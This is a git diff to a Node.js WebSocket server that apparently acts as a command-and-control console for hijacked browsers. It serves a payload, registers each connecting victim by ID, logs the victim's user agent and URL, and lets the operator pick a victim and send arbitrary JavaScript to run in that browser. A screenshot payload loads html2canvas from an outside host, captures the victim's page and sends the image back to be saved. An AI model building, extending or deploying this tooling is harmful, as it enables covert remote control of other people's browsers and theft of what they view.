@@ -25,39 +25,60 @@ app.get(`/${argv.file}`, (req, res) => {
   res.send(payload)
 })
 
-let clientSocket = false
+// let clientSocket = false
+let clients = []
 let prompt = false
+let first = true
+let selected = -1
 
 wsServer.on('connection', socket => {
-  console.log('client connected.')
-  clientSocket = socket
-  socket.on('message', handleMessage)
+  const id = clients.length
+  console.log(`client connected. ID: ${id}`)
+  clients.push(socket)
+  // clientSocket = socket
+  socket.on('message', msg => handleMessage(msg, id))
+  socket.on('close', () => console.log(`ID ${id} disconnected.`))
 })
 
-async function handleMessage(message) {
+async function handleMessage(message, id) {
   message = message.toString()
   message = JSON.parse(message)
   switch (message.type) {
     case 'output':
-      console.log(`> ${message.data}`)
+      console.log(`${id} > ${message.data}`)
       break
 
     case 'info':
-      console.log(`UA: ${message.data.browser}\nURL: ${message.data.url}`)
+      console.log(`${id} | UA: ${message.data.browser}\nURL: ${message.data.url}`)
       break
     
     case 'ss':
       const filename = `screenshot_${Date.now()}.png`
       const data = Buffer.from(message.data.replace('data:image/png;base64,', ''), 'base64')
-      console.log(`Received screenshot! Saved to ${filename}`)
+      console.log(`Received screenshot from ${id}! Saved to ${filename}`)
       fs.writeFileSync(filename, data)
       break
   
     default:
-      console.log(`Received unknown payload type: ${JSON.stringify(message)}`)
+      console.log(`Received unknown payload type from id ${id}: ${JSON.stringify(message)}`)
       break
   }
-  if (!prompt) commandPrompt()
+
+  if (!prompt && selected === id) commandPrompt()
+  if (first) selector()
+}
+
+async function selector() {
+  first = false 
+  const { id } = await prompts({
+    type: 'number',
+    name: 'id',
+    message: 'Client ID'
+  })
+  if (id === undefined) return process.exit() 
+  if (!clients[id]) return selector()
+  selected = id
+  commandPrompt()
 }
 
 async function commandPrompt() {
@@ -65,19 +86,21 @@ async function commandPrompt() {
   const { cmd } = await prompts({
     type: 'text',
     name: 'cmd',
-    message: 'js'
+    message: `js (${selected})`
   })
   prompt = false
 
   switch (cmd) {
     case '.exit':
-      process.exit()
+      selected = -1
+      selector()
+      return
     
     case '.ss':
       takeSS()
   
     default:
-      clientSocket.send(JSON.stringify({ type: 'run', data: cmd }))
+      clients[selected].send(JSON.stringify({ type: 'run', data: cmd }))
   }
 
   setTimeout(() => {
@@ -91,7 +114,7 @@ async function commandPrompt() {
 function takeSS() {
   console.log('Sending screenshot payload...')
   const payload = `import('https://html2canvas.hertzen.com/dist/html2canvas.min.js').then(() => html2canvas(document.body).then(canvas => socket.send(JSON.stringify({type:'ss',data:canvas.toDataURL('image/png')}))))`
-  clientSocket.send(JSON.stringify({ type: 'run', data: payload, noout: true }))
+  clients[selected].send(JSON.stringify({ type: 'run', data: payload, noout: true }))
   console.log('Payload sent.')
   setTimeout(() => {
     if (!prompt) {
